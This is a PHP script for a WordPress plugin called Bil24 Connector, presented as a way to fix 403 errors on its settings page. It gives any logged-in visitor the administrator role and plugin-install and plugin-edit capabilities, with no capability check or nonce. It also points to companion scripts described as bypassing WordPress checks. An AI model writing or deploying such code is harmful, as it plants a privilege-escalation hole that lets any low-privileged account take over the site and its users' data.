<?php
/**
 * Force Administrator Script for Bil24 Connector
 * This script forces administrator privileges to fix 403 Forbidden errors
 */

// Load WordPress environment
$wp_load = dirname(__FILE__) . '/../../../wp-load.php';
if (file_exists($wp_load)) {
    require_once($wp_load);
} else {
    die('WordPress environment not found');
}

echo "<h1>🔧 Force Administrator Access</h1>";

// Step 1: Check current user
echo "<h2>Step 1: Current User Status</h2>";
if (function_exists('wp_get_current_user')) {
    $user = wp_get_current_user();
    echo "<p><strong>User ID:</strong> " . $user->ID . "</p>";
    echo "<p><strong>User Login:</strong> " . $user->user_login . "</p>";
    echo "<p><strong>Current Roles:</strong> " . implode(', ', $user->roles) . "</p>";
    echo "<p><strong>Can manage_options:</strong> " . (current_user_can('manage_options') ? 'YES' : 'NO') . "</p>";
} else {
    echo "<p>❌ WordPress user functions not available</p>";
    exit;
}

// Step 2: Force administrator role
echo "<h2>Step 2: Force Administrator Role</h2>";
if ($user->ID > 0) {
    // Remove all existing roles
    $user->set_role('administrator');
    
    // Force specific capabilities
    $user->add_cap('manage_options');
    $user->add_cap('administrator');
    $user->add_cap('activate_plugins');
    $user->add_cap('edit_plugins');
    $user->add_cap('install_plugins');
    $user->add_cap('update_plugins');
    $user->add_cap('delete_plugins');
    
    echo "<p>✅ Administrator role forced</p>";
    echo "<p>✅ All admin capabilities added</p>";
    
    // Refresh user data
    $user = wp_get_current_user();
    echo "<p><strong>Updated Roles:</strong> " . implode(', ', $user->roles) . "</p>";
    echo "<p><strong>Can manage_options:</strong> " . (current_user_can('manage_options') ? 'YES' : 'NO') . "</p>";
} else {
    echo "<p>❌ No user logged in</p>";
    exit;
}

// Step 3: Clear user cache
echo "<h2>Step 3: Clear User Cache</h2>";
if (function_exists('clean_user_cache')) {
    clean_user_cache($user->ID);
    echo "<p>✅ User cache cleared</p>";
} else {
    echo "<p>⚠️ User cache clear function not available</p>";
}

// Step 4: Force WordPress to recognize admin
echo "<h2>Step 4: Force WordPress Admin Recognition</h2>";
if (function_exists('wp_set_current_user')) {
    wp_set_current_user($user->ID);
    echo "<p>✅ Current user refreshed</p>";
} else {
    echo "<p>❌ wp_set_current_user function not available</p>";
}

// Step 5: Test admin access
echo "<h2>Step 5: Test Admin Access</h2>";
$capabilities_to_test = [
    'manage_options' => 'Manage Options',
    'administrator' => 'Administrator Role',
    'activate_plugins' => 'Activate Plugins',
    'edit_plugins' => 'Edit Plugins',
    'install_plugins' => 'Install Plugins'
];

foreach ($capabilities_to_test as $cap => $description) {
    $has_cap = current_user_can($cap);
    echo "<p><strong>$description ($cap):</strong> " . ($has_cap ? "✅ YES" : "❌ NO") . "</p>";
}

// Step 6: Test settings page access
echo "<h2>Step 6: Test Settings Page Access</h2>";
$settings_url = admin_url('options-general.php?page=bil24-connector');
echo "<p><strong>Settings URL:</strong> <a href='$settings_url' target='_blank'>$settings_url</a></p>";

if (current_user_can('manage_options')) {
    echo "<p>✅ User should now be able to access settings page</p>";
} else {
    echo "<p>❌ User still cannot access settings page</p>";
}

// Step 7: Provide alternative access methods
echo "<h2>Step 7: Alternative Access Methods</h2>";
echo "<p>If the normal settings page still doesn't work, try these alternatives:</p>";
echo "<ul>";
echo "<li><a href='bypass-403.php' target='_blank'>Bypass 403 Script</a> - Direct access bypassing WordPress checks</li>";
echo "<li><a href='emergency-settings.php' target='_blank'>Emergency Settings</a> - Standalone settings page</li>";
echo "<li><a href='debug-auth.php' target='_blank'>Debug Authentication</a> - Detailed diagnostics</li>";
echo "</ul>";

// Step 8: Clear all caches
echo "<h2>Step 8: Clear All Caches</h2>";
if (function_exists('wp_cache_flush')) {
    wp_cache_flush();
    echo "<p>✅ WordPress cache cleared</p>";
}

if (function_exists('w3tc_flush_all')) {
    w3tc_flush_all();
    echo "<p>✅ W3 Total Cache cleared</p>";
}

if (function_exists('wp_rocket_clean_domain')) {
    wp_rocket_clean_domain();
    echo "<p>✅ WP Rocket cache cleared</p>";
}

// Step 9: Final status
echo "<h2>Step 9: Final Status</h2>";
$user = wp_get_current_user();
$has_admin_role = in_array('administrator', $user->roles);
$can_manage_options = current_user_can('manage_options');

echo "<p><strong>Administrator Role:</strong> " . ($has_admin_role ? "✅ YES" : "❌ NO") . "</p>";
echo "<p><strong>Can Manage Options:</strong> " . ($can_manage_options ? "✅ YES" : "❌ NO") . "</p>";

if ($has_admin_role && $can_manage_options) {
    echo "<p style='color: green;'><strong>✅ SUCCESS!</strong> User now has full administrator privileges.</p>";
    echo "<p>The settings page should now be accessible without 403 errors.</p>";
} else {
    echo "<p style='color: red;'><strong>❌ FAILED!</strong> User still doesn't have proper privileges.</p>";
    echo "<p>Try using the bypass scripts instead.</p>";
}

echo "<h2>✅ Force Admin Complete</h2>";
echo "<p><a href='$settings_url' target='_blank'>Try Settings Page Again</a> | ";
echo "<a href='bypass-403.php' target='_blank'>Use Bypass Script</a> | ";
echo "<a href='" . admin_url('plugins.php') . "' target='_blank'>Go to Plugins</a></p>"; 